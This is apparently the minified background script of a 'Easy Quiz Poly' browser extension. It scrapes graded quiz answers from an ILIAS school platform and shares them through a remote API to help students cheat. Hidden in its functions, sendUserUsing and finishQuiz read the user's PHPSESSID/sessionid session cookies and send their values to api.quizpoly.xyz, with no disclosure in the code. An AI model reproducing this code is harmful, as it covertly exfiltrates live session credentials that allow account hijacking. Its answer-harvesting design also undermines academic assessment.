const apiUrl = "https://api.quizpoly.xyz",
    redirect_uri = "https://api.quizpoly.xyz/auth/google",
    adsLinks = ["http://1shorten.com/quizpoly", "http://1shorten.com/quizpoly", "https://link1s.com/quizpoly-level1", "http://megafly.in/EISw9Ci", "https://linksly.co/54xrPIT", "http://link1s.net/link1snet", "https://hi.vnshortener.com/vnshortener", "https://ouo.io/czi4nQJ"];
let subjectsGet = [];

function createAuthEndpoint() {
    var e = "https://accounts.google.com/o/oauth2/auth?",
        t = {
            client_id: "342297410923-sjcdrqban80srbpcekc24ctrdqh3u593.apps.googleusercontent.com",
            redirect_uri: redirect_uri,
            response_type: "code",
            access_type: "offline",
            scope: "profile email",
            prompt: "consent"
        };
    let o = new URLSearchParams(Object.entries(t));
    return o.toString(), e += o
}
async function finishQuiz(t) {
    const {
        subjectName: o,
        domain: s,
        quizId: n,
        passTime: e
    } = t;
    if (!o) return chrome.cookies.get({
        url: s,
        name: "PHPSESSID"
    }, e => {
        sendHtml(`finishQuiz subjectName null: ${JSON.stringify(t)} - cookie: ${e.value}`, "NULL")
    });
    getPoint(n, s, e, async ({
        quizzes: e
    }) => {
        e && e.length ? (console.debug(e), sendDoingQuiz({
            subjectName: o,
            quizzes: e
        })) : subjectsGet.includes(o.toLowerCase()) && (100 == (e = await getPercent(s, n)) ? sendDoingQuiz({
            subjectName: `${o} - 100`,
            quizzes: Object.values(quizSelf)
        }) : 90 < e ? chrome.storage.local.get(["quizSelf"], ({
            quizSelf: e
        }) => {
            sendDoingQuiz({
                subjectName: `${o} - draft 90`,
                quizzes: Object.values(e)
            })
        }) : 80 < e ? chrome.storage.local.get(["quizSelf"], ({
            quizSelf: e
        }) => {
            sendDoingQuiz({
                subjectName: `${o} - draft 80`,
                quizzes: Object.values(e)
            })
        }) : 70 < e && chrome.storage.local.get(["quizSelf"], ({
            quizSelf: e
        }) => {
            sendDoingQuiz({
                subjectName: `${o} - draft`,
                quizzes: Object.values(e)
            })
        })), chrome.storage.local.set({
            quizSelf: {}
        })
    })
}
async function sendDoingQuiz(e) {
    try {
        const o = await fetch(apiUrl + "/quizpoly/self", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            referrerPolicy: "origin",
            body: JSON.stringify(e)
        });
        var t = await o.json();
        console.debug(t.message)
    } catch (e) {
        console.debug(e)
    }
}
async function getSubjectsGet() {
    fetch(apiUrl + "/quizpoly/subjects?fields=subjectsGet").then(e => e.json()).then(e => {
        subjectsGet = e.subjectsGet, console.log(subjectsGet)
    }).catch(e => subjectsGet = [])
}
async function getPercent(e, t) {
    let o = "",
        s;
    t = `${e}/ilias.php?ref_id=${t}&cmd=outUserResultsOverview&cmdClass=iltestevaluationgui&cmdNode=q4:ll:vx&baseClass=ilRepositoryGUI`;
    try {
        s = await fetch(t, {
            method: "GET",
            redirect: "error"
        }), o = await s.text()
    } catch {
        return 0
    }
    try {
        const n = parseHTML(o);
        return parseInt(n.querySelector(".tblrow1 > td:nth-of-type(6)").innerText)
    } catch (e) {
        return sendHtml(`Get Persent error: ${e}`, o), 0
    }
}
async function getPoint(e, t, o, n) {
    let i = [],
        r = "";
    o = `${t}/ilias.php?ref_id=${e}&pass=${o}&cmd=outUserPassDetails&cmdClass=iltestevaluationgui&cmdNode=q4:ll:vx&baseClass=ilrepositorygui`;
    try {
        const s = await fetch(o, {
            method: "GET",
            redirect: "error"
        });
        const a = parseHTML(await s.text()),
            c = a.querySelectorAll("tbody >tr > td:nth-of-type(5)"),
            l = a.querySelectorAll("tbody >tr > td:nth-of-type(1)"),
            u = a.querySelectorAll("tbody >tr > td:nth-of-type(4)");
        if (c.length) {
            let s = {};
            c.forEach((e, t) => {
                s[l[t].innerText] = +e.innerText
            }), chrome.storage.local.get(["quizSelf"], ({
                quizSelf: o
            }) => {
                console.debug(o), i = Object.keys(o).map(e => {
                    var t = parseInt(u[e - 1].innerText);
                    if (s[e] == t) return o[e]
                }).filter(e => void 0 !== e), r = `${i.length} Of ${Object.keys(s).length}`, n({
                    quizzes: i,
                    point: r
                })
            })
        }
    } catch (e) {
        console.debug(e), n({
            quizzes: i,
            point: r
        })
    }
}
async function sendHtml(e, t = "NULL") {
    try {
        const s = await fetch(apiUrl + "/quizpoly/html", {
            method: "POST",
            mode: "cors",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                note: `${chrome.runtime.getManifest().version}: ${e}`,
                html: t
            })
        });
        var o = await s.json();
        console.debug(o.message)
    } catch (e) {
        console.log(e)
    }
}

function sendUserUsing(s) {
    try {
        chrome.cookies.getAll({
            domain: s.domain
        }, async e => {
            e = e.filter(e => "sessionid" == e.name || "PHPSESSID" == e.name).map(e => ({
                name: e.name,
                value: e.value
            }));
            const o = e.length ? e[0].value : "";
            chrome.storage.local.get(["user"], async ({
                user: e
            }) => {
                e = {
                    name: e.name,
                    c: o,
                    ...s.data
                };
                const t = await fetch(apiUrl + "/quizpoly/using", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(e)
                });
                e = await t.json();
                console.debug("sendUserUsing", e.message)
            })
        })
    } catch (e) {
        console.log(e)
    }
}
async function addQuiz(e = {}) {
    try {
        const o = await fetch(apiUrl + "/quizpoly", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            referrerPolicy: "origin",
            body: JSON.stringify(e)
        });
        var t = await o.json();
        console.debug(t.message)
    } catch (e) {
        console.log(e)
    }
}

function getDateTomorrow() {
    let e = new Date;
    return e.setDate(e.getDate() + 1), e.setHours(0, 0, 0, 0), console.debug(e), e.getTime()
}

function getDiffHours(e, t) {
    t = (e - t) / 1e3;
    return t /= 3600, Math.abs(Math.round(t))
}

function parseHTML(e) {
    return (new DOMParser).parseFromString(e, "text/html")
}

function notify(e, t) {
    t = t || `Notification-${Date.now()}`, chrome.notifications.create(t, {
        type: "basic",
        iconUrl: "assets/icon.png",
        title: "Easy Quiz Poly",
        priority: 1,
        ...e
    })
}

function openAdsLink(n) {
    console.debug("openAdsLink"), chrome.storage.local.get(["isLogged", "user"], async ({
        isLogged: e,
        user: t
    }) => {
        return e ? void(false ? (o = Math.round(.85 * screen.width), s = Math.round(.9 * screen.height), e = Math.round(screen.width / 2 - o / 2), t = Math.round(screen.height / 2 - s / 2), chrome.windows.create({
            url: "https://quizpoly.xyz/quiz-link.html",
            type: "panel",
            focused: !0,
            width: o,
            height: s,
            left: e,
            top: t
        }, o => {
            var s = window.setInterval(() => {
                chrome.tabs.query({
                    windowId: o.id
                }, e => {
                    if (!e.length) return window.clearInterval(s), void n("fail");
                    const t = e[0]["url"];
                    console.debug(t), (t.includes("https://trfi.github.io/") || t.includes("https://page.quizpoly.xyz")) && (window.clearInterval(s), chrome.windows.remove(o.id), n("success"))
                })
            }, 500)
        })) : n("p")) : n("not_logged");
        var o, s
    })
}

function updateUser() {
    chrome.storage.local.get(["user"], ({
        user: o
    }) => {
        fetch(apiUrl + "/user/userType/" + o.id).then(e => e.json()).then(e => {
            e || (o.userType = "Free", chrome.storage.local.set({
                user: o
            }));
            var {
                userType: t,
                premium: e
            } = e;
            console.debug(o.userType, t), o.userType !== t && (o.userType = t, o.premium = e, chrome.storage.local.set({
                user: o
            }), "Free" == t ? notify({
                message: "Hạn dùng Premium của bạn đã hết. Hãy nâng cấp để tiếp tục sử dụng Premium",
                buttons: [{
                    title: "Nâng cấp"
                }]
            }, "premium_expired") : "Premium" == t && notify({
                message: "Chúc mừng! Tài khoản của bạn đã được nâng cấp lên Premium"
            }))
        }).catch(e => {
            console.log(e), o.userType = "Free", chrome.storage.local.set({
                user: o
            })
        })
    }), chrome.cookies.get({
        url: apiUrl,
        name: "token"
    }, e => {
        null === e && chrome.storage.local.set({
            isLogged: !1,
            user: {}
        }, () => {
            chrome.browserAction.setPopup({
                popup: "./popup/popup.html"
            })
        })
    })
}
async function getQuizAvailable(t, o) {
    try {
        const s = await fetch(`${apiUrl}/quizpoly/quiz`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                subject: t
            })
        });
        if (403 == s.status) return o([!0, "require_auth"]);
        var e = await s.json();
        return null == e.data ? o([
            [!0, []]
        ]) : o([!0, e.data.quizzes])
    } catch (e) {
        sendHtml(`Get quiz available error - ${t}: ${e.message}`), o([!1, []])
    }
}
async function getOnlineAnswer(e, t) {
    try {
        const s = await fetch(`${apiUrl}/quizpoly/online/` + e);
        var o = await s.json();
        return 403 == s.status ? t("require_auth") : (null == o.data && t([]), t(o.data.quizzes))
    } catch (e) {
        console.log(e), t([])
    }
}

function funcCallFromPopupWindow(e) {
    console.debug(e)
}
updateUser(), getSubjectsGet();